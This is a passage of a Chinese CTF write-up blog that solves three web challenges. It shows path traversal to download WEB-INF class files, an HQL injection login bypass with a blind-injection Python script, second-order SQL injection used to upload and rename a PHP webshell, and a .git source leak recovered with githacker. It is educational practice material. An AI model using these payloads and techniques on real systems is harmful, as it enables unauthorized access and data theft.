</span></span><span class="line"><span class="cl">        <span class="nt">&lt;action</span> <span class="na">name=</span><span class="s">&#34;list&#34;</span> <span class="na">class=</span><span class="s">&#34;com.cuitctf.action.AdminAction&#34;</span> <span class="na">method=</span><span class="s">&#34;execute&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;interceptor-ref</span> <span class="na">name=</span><span class="s">&#34;userAuth&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">&#34;excludeMethods&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">                    execute
</span></span><span class="line"><span class="cl">                <span class="nt">&lt;/param&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/interceptor-ref&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;login_error&#34;</span><span class="nt">&gt;</span>/ctfpage/login.jsp<span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;list_error&#34;</span><span class="nt">&gt;</span>/ctfpage/welcome.jsp<span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;result</span> <span class="na">name=</span><span class="s">&#34;success&#34;</span><span class="nt">&gt;</span>/ctfpage/welcome.jsp<span class="nt">&lt;/result&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/action&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/package&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/struts&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåclassÈáåÈù¢ÂèØ‰ª•ÁúãÂà∞ÂæàÂ§öclassÁ±ªÂêçÔºåÂ∞ùËØï‰∫Ü‰∏Ä‰∏ãÔºåÈÉΩÂèØ‰ª•ÈÄê‰∏™‰∏ãËΩΩÔºåÁÇπÂè∑Êç¢ÊàêÊ≠£ÊñúÊù†ÔºåÁÑ∂ÂêéÂÜçÂú®ÂêéÈù¢Âä†‰∏™.classÂ∞±ÂèØ‰ª•‰∏ãËΩΩ‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">action</span><span class="o">/</span><span class="n">UserLoginAction</span><span class="o">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">action</span><span class="o">/</span><span class="n">DownloadAction</span><span class="o">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">util</span><span class="o">/</span><span class="n">UserOAuth</span><span class="o">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">action</span><span class="o">/</span><span class="n">AdminAction</span><span class="o">.</span><span class="k">class</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áî±‰∫é‰∏ãËΩΩ‰∏ãÊù•ÁöÑclassÊñá‰ª∂Êó†Ê≥ïÊ≠£Â∏∏ÈòÖËØªÔºåÊàë‰ª¨ÈúÄË¶ÅÂ∞ÜÂÖ∂ÂèçÁºñËØëÊàêjavaÊ∫ê‰ª£Á†Å„ÄÇ</p>
<p>ÊâìÂºÄjd-guiÂ∑•ÂÖ∑ÔºåÂ∞ÜclassÊñá‰ª∂Áõ¥Êé•ÊãñËøõÂéªÂç≥ÂèØ„ÄÇ</p>
<p>UserLoginAction.classËøôÈáåÂºïÁî®‰∫ÜÂÖ∂‰ªñ‰∏â‰∏™Á±ªÔºåÊàë‰ª¨‰∏ãËΩΩÊù•ÁúãÁúã</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203130619285.png"
	width="804"
	height="81"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203130619285_hu16881783634455472458.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203130619285_hu9260693623456118297.png 1024w"
	loading="lazy"
	
		alt="image-20250203130619285"
	
	
		class="gallery-image" 
		data-flex-grow="992"
		data-flex-basis="2382px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">po</span><span class="o">/</span><span class="n">User</span><span class="o">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">service</span><span class="o">/</span><span class="n">UserService</span><span class="o">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">util</span><span class="o">/</span><span class="n">InitApplicationContext</span><span class="o">.</span><span class="k">class</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203131015392.png"
	width="902"
	height="282"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203131015392_hu3035784747572846490.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203131015392_hu15654764521026177406.png 1024w"
	loading="lazy"
	
		alt="image-20250203131015392"
	
	
		class="gallery-image" 
		data-flex-grow="319"
		data-flex-basis="767px"
	
></p>
<p>ÊâæÂà∞‰∏Ä‰∏™xmlÔºå‰∏ãËΩΩ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">applicationContext</span><span class="o">.</span><span class="n">xml</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÂèëÁé∞user.hbm.xmlÂíå‰∏§‰∏™Á±ª</p>
<p>ÁªßÁª≠‰∏ãËΩΩ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">user</span><span class="o">.</span><span class="n">hbm</span><span class="o">.</span><span class="n">xml</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">service</span><span class="o">/</span><span class="n">impl</span><span class="o">/</span><span class="n">UserServiceImpl</span><span class="o">.</span><span class="k">class</span>
</span></span><span class="line"><span class="cl"><span class="n">loadimage</span><span class="err">?</span><span class="n">fileName</span><span class="o">=../../</span><span class="n">WEB</span><span class="o">-</span><span class="bp">INF</span><span class="o">/</span><span class="n">classes</span><span class="o">/</span><span class="n">com</span><span class="o">/</span><span class="n">cuitctf</span><span class="o">/</span><span class="n">dao</span><span class="o">/</span><span class="n">impl</span><span class="o">/</span><span class="n">UserDaoImpl</span><span class="o">.</span><span class="k">class</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203133339228.png"
	width="986"
	height="689"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203133339228_hu2593498161675548169.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203133339228_hu15764969095108590979.png 1024w"
	loading="lazy"
	
		alt="image-20250203133339228"
	
	
		class="gallery-image" 
		data-flex-grow="143"
		data-flex-basis="343px"
	
></p>
<p>ËøôÈáåËøáÊª§‰∫ÜÁî®Êà∑ÂêçÁöÑÁ©∫Ê†ºÂíåÁ≠âÂè∑</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203133551988.png"
	width="905"
	height="364"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203133551988_hu8841099236303492315.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203133551988_hu12366564774236186266.png 1024w"
	loading="lazy"
	
		alt="image-20250203133551988"
	
	
		class="gallery-image" 
		data-flex-grow="248"
		data-flex-basis="596px"
	
></p>
<p>ËøôÈáåÊúâHQLÊü•ËØ¢ËØ≠Âè•</p>
<p>ÊûÑÈÄ†‰∏áËÉΩÂØÜÁ†Å</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">from</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">&gt;</span><span class="s1">&#39;0&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#34; + password + &#34;&#39;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Âõ†‰∏∫‰∏äÈù¢ËøáÊª§Á©∫Ê†ºÔºåÊàë‰ª¨Áî®%09ÊàñËÄÖ%0A‰ª£Êõø</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Áî®Êà∑ÂêçÔºöadmin&#39;%0Aor%0A&#39;1&#39;&gt;&#39;0&#39;%0Aor%0Aname%0Alike%0A&#39;admin
</span></span><span class="line"><span class="cl">ÂØÜÁ†ÅÔºö123ÔºàÈöèÊÑèÔºâ
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áî®hackbarget‰º†ÂèÇ</p>
<p>Âõ†‰∏∫ÊäìÂåÖÁöÑÂèÇÊï∞ÊòØËøôÊ†∑</p>
<p><img src="C:%5cUsers%5c10086%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250203134314242.png"
	
	
	
	loading="lazy"
	
		alt="image-20250203134314242"
	
	
></p>
<p>ÊâÄ‰ª•Êàë‰ª¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?user.name=admin&#39;%0Aor%0A&#39;1&#39;&gt;&#39;0&#39;%0Aor%0Aname%0Alike%0A&#39;admin&amp;user.password=1
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203134515527.png"
	width="1678"
	height="640"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203134515527_hu17977927402897636177.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203134515527_hu311653241147089224.png 1024w"
	loading="lazy"
	
		alt="image-20250203134515527"
	
	
		class="gallery-image" 
		data-flex-grow="262"
		data-flex-basis="629px"
	
></p>
<p>ÁôªÂÖ•ÊàêÂäüÔºå‰ΩÜÊòØÊâæ‰∏çÂà∞flag</p>
<p>ÊÉ≥Âà∞Ââç‰∏ãuser.hbm.xmlÊ≤°Áî®Âà∞</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203135031212.png"
	width="719"
	height="156"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203135031212_hu3376332785304699892.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203135031212_hu6106404882861438154.png 1024w"
	loading="lazy"
	
		alt="image-20250203135031212"
	
	
		class="gallery-image" 
		data-flex-grow="460"
		data-flex-basis="1106px"
	
></p>
<p>flagÂ∞±Âú®Êï∞ÊçÆÂ∫ì‰∏≠Ôºå</p>
<p>ËøôÈáåÁî®Â§ß‰Ω¨‰ª¨ÁöÑÁõ≤Ê≥®ËÑöÊú¨</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">255</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;(select%0Aascii(substr(id,&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;&#39;&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#print payload</span>
</span></span><span class="line"><span class="cl">        <span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://61.147.171.105:53636/zhuanxvlogin?user.name=admin&#39;%0Aor%0A&#34;</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="s2">&#34;%0Aor%0Aname%0Alike%0A&#39;admin&amp;user.password=1&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">r1</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#print url</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#print len(r1.text)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">r1</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">20000</span> <span class="ow">and</span> <span class="n">p</span><span class="o">!=</span><span class="s1">&#39;&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">flag</span><span class="o">+=</span><span class="n">p</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">p</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â∞Üpayload‰∏≠ÁöÑwhere id&lt;2Âà†Èô§ÂêéÂÜçÁàÜÁ†¥ÔºåÂèëÁé∞‰πüËÉΩÊàêÂäü„ÄÇÁåúÊÉ≥FlagË°®‰∏≠Â∫îËØ•Âè™Êúâ‰∏Ä‰∏™idÂàó</p>
<h2 id="filemanager">filemanager
</h2><p>ÁõÆÂΩïÊâ´Êèè</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203141015130.png"
	width="615"
	height="75"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203141015130_hu11893036836297420085.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203141015130_hu10463912168395755350.png 1024w"
	loading="lazy"
	
		alt="image-20250203141015130"
	
	
		class="gallery-image" 
		data-flex-grow="820"
		data-flex-basis="1968px"
	
></p>
<p>Êâ´Âà∞‰∏Ä‰∏™ÂéãÁº©ÂåÖ</p>
<p>ËôöÊãüÊú∫‰∏≠Ëß£ÂéãÁº©</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203141244757.png"
	width="643"
	height="486"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203141244757_hu13320686955636529379.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203141244757_hu10703848677263460937.png 1024w"
	loading="lazy"
	
		alt="image-20250203141244757"
	
	
		class="gallery-image" 
		data-flex-grow="132"
		data-flex-basis="317px"
	
></p>
<p>Ê£ÄÊü•Â•ΩÂá†‰∏™phpÊñá‰ª∂Ê≤°ÊúâÊñπÂêë</p>
<p>ÂèëÁé∞rename.phpÈáåÈù¢Ë¶ÅÊ±ÇÊñ∞Êñá‰ª∂ÂíåÊóßÊñá‰ª∂ÁöÑÊãìÂ±ïÂêçË¶ÅÁõ∏ÂêåÔºåÊàë‰ª¨Ê≤°ÂäûÊ≥ïÊîπÂêéÁºÄÂêç</p>
<p>‰ΩÜÊòØÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá‰∫åÊ¨°Ê≥®ÂÖ•ÔºåÊù•‰ΩøÂæóÂÖ∂‰∏≠ËÄÅÊñá‰ª∂ÁöÑÊãìÂ±ïÂêç‰∏∫Á©∫ÔºåËøôÊ†∑Â∞±ÂèØ‰ª•‰øÆÊîπÊãìÂ±ïÂêç‰∏∫php</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203143909661.png"
	width="1244"
	height="88"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203143909661_hu12887275504808613078.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203143909661_hu12383427742309040749.png 1024w"
	loading="lazy"
	
		alt="image-20250203143909661"
	
	
		class="gallery-image" 
		data-flex-grow="1413"
		data-flex-basis="3392px"
	
></p>
<p>ËøôÊÆµoldnameÊòØÊü•ËØ¢Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑfilenameÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•‰º†ÂÖ•<code>',extension='</code>Èöè‰æøÁ¨¶ÂêàÊù°‰ª∂ÁöÑÂêéÁºÄÂêç</p>
<p>ÁÑ∂ÂêéËøôÊ†∑Êï∞ÊçÆÂ∫ìÊü•ËØ¢oldnameÁöÑÊó∂ÂÄôÂ∞±‰ºöÊúâ‰∫åÊ¨°Ê≥®ÂÖ•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="k">update</span><span class="w"> </span><span class="o">`</span><span class="n">file</span><span class="o">`</span><span class="w"> </span><span class="kt">set</span><span class="w"> </span><span class="o">`</span><span class="n">filename</span><span class="o">`=</span><span class="s1">&#39;shell.txt&#39;</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">oldname</span><span class="o">`=</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="n">extension</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="o">`</span><span class="n">fid</span><span class="o">`=</span><span class="err">{$</span><span class="n">result</span><span class="p">[</span><span class="s1">&#39;fid&#39;</span><span class="p">]</span><span class="err">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÊ†∑Â∞±ÊòØÊñ∞Êñá‰ª∂Âêç‰∏∫shell.txtÁÑ∂ÂêéÂêéÁºÄÂêç‰∏∫Á©∫</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144300058.png"
	width="616"
	height="102"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144300058_hu10560253190142683119.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203144300058_hu12650125995918739510.png 1024w"
	loading="lazy"
	
		alt="image-20250203144300058"
	
	
		class="gallery-image" 
		data-flex-grow="603"
		data-flex-basis="1449px"
	
></p>
<p>ËøôÈáåÁöÑfile_existsË¶ÅÊ±ÇÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑoldnameÂ≠òÂú®ÔºåÁî±‰∫éÊàë‰ª¨Êääshell.txtÁöÑÂêéÁºÄÂêçÊîπ‰∏∫Á©∫‰∫Ü</p>
<p>Êàë‰ª¨Ë¶ÅÂÜç‰∏ä‰º†‰∏Ä‰∏™ÂêåÊ†∑ÂêçÂ≠óÁöÑÊñá‰ª∂ÔºåÊâçËÉΩ‰øÆÊîπÂêéÁºÄÂêçÊù•getshell</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144608568.png"
	width="728"
	height="335"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144608568_hu815916018958866881.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203144608568_hu15447398238044087773.png 1024w"
	loading="lazy"
	
		alt="image-20250203144608568"
	
	
		class="gallery-image" 
		data-flex-grow="217"
		data-flex-basis="521px"
	
></p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144625067.png"
	width="529"
	height="61"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144625067_hu9531982725275530698.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203144625067_hu6406637426756258138.png 1024w"
	loading="lazy"
	
		alt="image-20250203144625067"
	
	
		class="gallery-image" 
		data-flex-grow="867"
		data-flex-basis="2081px"
	
></p>
<p>ËøôÈáåËôΩÁÑ∂ÊòæÁ§∫shell.txt.txtÂÆûÈôÖ‰∏äÊ≤°ÂêéÁºÄÂêçÔºå‰∏ä‰º†‰∏Ä‰∏™ÂåÖÂê´Êú®È©¨ÁöÑshell.txtÔºå‰øÆÊîπÂêéÁºÄÂêç</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144849442.png"
	width="769"
	height="305"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203144849442_hu955990329086851345.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203144849442_hu619314597507002325.png 1024w"
	loading="lazy"
	
		alt="image-20250203144849442"
	
	
		class="gallery-image" 
		data-flex-grow="252"
		data-flex-basis="605px"
	
></p>
<p>ËöÅÂâëËøûÊé•</p>
<h2 id="comment">comment
</h2><p>ÂèëÂ∏ñÊèê‰∫§Ë¶ÅÊ±ÇÁôªÂÖ•</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203151743482.png"
	width="612"
	height="235"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203151743482_hu6830841619439594575.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203151743482_hu14263034426658115957.png 1024w"
	loading="lazy"
	
		alt="image-20250203151743482"
	
	
		class="gallery-image" 
		data-flex-grow="260"
		data-flex-basis="625px"
	
></p>
<p>ÁàÜÁ†¥ÂØÜÁ†Å</p>
<p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203151939328.png"
	width="1904"
	height="1012"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203151939328_hu15975058566299924181.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203151939328_hu14522394149914316584.png 1024w"
	loading="lazy"
	
		alt="image-20250203151939328"
	
	
		class="gallery-image" 
		data-flex-grow="188"
		data-flex-basis="451px"
	
></p>
<p>ÁàÜÂá∫Êù•666ÁôªÂÖ•</p>
<p>ÁõÆÂΩïÊâ´ÊèèÂá∫Êù•ÂæàÂ§ögitÔºåÊÄÄÁñëÊòØgitÊ≥ÑÈú≤</p>
<p>Áî®githacker‰∏ãËΩΩ‰∏ãÊù•ÁöÑÊ∫êÁ†Å‰∏çÂÖ®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">githacker --url http://61.147.171.105:57107/.git --output-folder ./result
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êé•‰∏ãÊù•‰øÆÂ§ç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git log --reflog
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xctf%E5%88%B7%E9%A2%98/image-20250203155053627.png"
	width="1483"
	height="762"
	srcset="/p/xctf%E5%88%B7%E9%A2%98/image-20250203155053627_hu16735290816861453862.png 480w, /p/xctf%E5%88%B7%E9%A2%98/image-20250203155053627_hu13987348231357364313.png 1024w"
	loading="lazy"
	
		alt="image-20250203155053627"
	
	
		class="gallery-image" 
		data-flex-grow="194"
		data-flex-basis="467px"
	
></p>
<p>ÈÄâÊã©Á¨¨‰∏Ä‰∏™ÊÅ¢Â§ç</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êü•ÁúãÊ∫êÁ†ÅÁ°ÆÂÆûÊÅ¢Â§ç‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
